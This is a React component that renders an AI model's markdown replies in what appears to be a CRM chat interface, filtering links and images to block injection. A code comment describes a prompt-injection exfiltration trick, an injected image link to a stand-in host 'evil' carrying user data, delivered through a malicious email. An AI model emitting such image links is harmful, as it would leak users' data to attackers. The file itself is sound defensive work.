"use client";

import type { ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { useConversationActions } from "@/hooks/useConversation";

const LINK_CLASS = "text-indigo-600 dark:text-indigo-400 underline underline-offset-2 hover:text-indigo-700 dark:hover:text-indigo-300";
// Contact/deal IDs such as c14, d3, c16_1775670614507
const ENTITY_ID = /^([cd])\d+(_\d+)?$/;
// A file served by /api/files/[id]. Matched exactly so encoded traversal
// ("%2e%2e/") or a query string can't redirect the request to another route.
const LOCAL_FILE = /^\/api\/files\/[A-Za-z0-9_-]+$/;

// The model sometimes links names to raw record IDs ([Mike Davis](c14)); as a
// URL that would navigate away to a 404, so open the record in chat instead.
// Other relative paths, except served files, render as plain text.
function MarkdownLink({ href, children }: { href?: string; children?: ReactNode }) {
  const { triggerIntent } = useConversationActions();
  const entity = href?.match(ENTITY_ID);

  if (entity) {
    const label = typeof children === "string" ? children : undefined;
    return (
      <button
        type="button"
        className={LINK_CLASS}
        onClick={() =>
          entity[1] === "c"
            ? triggerIntent("contact-detail", { contactId: href, __chipLabel: label })
            : triggerIntent("deal-detail", { dealId: href, __chipLabel: label })
        }
      >
        {children}
      </button>
    );
  }

  const external = /^https?:\/\//.test(href ?? "");
  if (!href || !(external || href.startsWith("mailto:") || LOCAL_FILE.test(href))) {
    return <span>{children}</span>;
  }
  return (
    <a href={href} className={LINK_CLASS} {...(external ? { target: "_blank", rel: "noopener noreferrer" } : {})}>
      {children}
    </a>
  );
}

// Styled to match the rich-response components. Raw HTML in model output is
// not rendered (react-markdown's default), so LLM text can't inject markup.
const components: Components = {
  p: ({ children }) => <p className="mb-3 last:mb-0">{children}</p>,
  strong: ({ children }) => <strong className="font-semibold text-foreground">{children}</strong>,
  em: ({ children }) => <em className="italic">{children}</em>,
  h1: ({ children }) => <h3 className="text-lg font-semibold text-foreground mt-4 mb-2 first:mt-0">{children}</h3>,
  h2: ({ children }) => <h3 className="text-lg font-semibold text-foreground mt-4 mb-2 first:mt-0">{children}</h3>,
  h3: ({ children }) => <h4 className="text-base font-semibold text-foreground mt-3 mb-1.5 first:mt-0">{children}</h4>,
  ul: ({ children }) => <ul className="list-disc pl-5 mb-3 last:mb-0 space-y-1 marker:text-muted-foreground">{children}</ul>,
  ol: ({ children }) => <ol className="list-decimal pl-5 mb-3 last:mb-0 space-y-1 marker:text-muted-foreground">{children}</ol>,
  li: ({ children }) => <li className="pl-1">{children}</li>,
  a: MarkdownLink,
  // Images load without a click, so an injected ![](https://evil/?data=...) in
  // model output (e.g. from a malicious email) would leak data. Only allow
  // files served by this app.
  img: ({ src, alt }) =>
    typeof src === "string" && LOCAL_FILE.test(src) ? (
      // eslint-disable-next-line @next/next/no-img-element
      <img src={src} alt={alt ?? ""} className="max-w-full rounded-lg my-2" />
    ) : null,
  code: ({ children }) => (
    <code className="font-mono text-[0.85em] px-1.5 py-0.5 rounded-md bg-muted text-foreground">{children}</code>
  ),
  blockquote: ({ children }) => (
    <blockquote className="border-l-2 border-border pl-3 text-muted-foreground mb-3 last:mb-0">{children}</blockquote>
  ),
  hr: () => <hr className="my-4 border-border" />,
  table: ({ children }) => (
    <div className="my-3 overflow-x-auto rounded-xl border border-border">
      <table className="w-full text-sm">{children}</table>
    </div>
  ),
  thead: ({ children }) => <thead className="bg-muted/50">{children}</thead>,
  tr: ({ children }) => <tr className="border-b border-border last:border-0">{children}</tr>,
  th: ({ children }) => (
    <th className="px-3 py-2 text-left text-[11px] font-semibold uppercase tracking-wider text-muted-foreground whitespace-nowrap">
      {children}
    </th>
  ),
  td: ({ children }) => <td className="px-3 py-2 align-top text-foreground">{children}</td>,
};

export function MessageMarkdown({ content }: { content: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
      {content}
    </ReactMarkdown>
  );
}
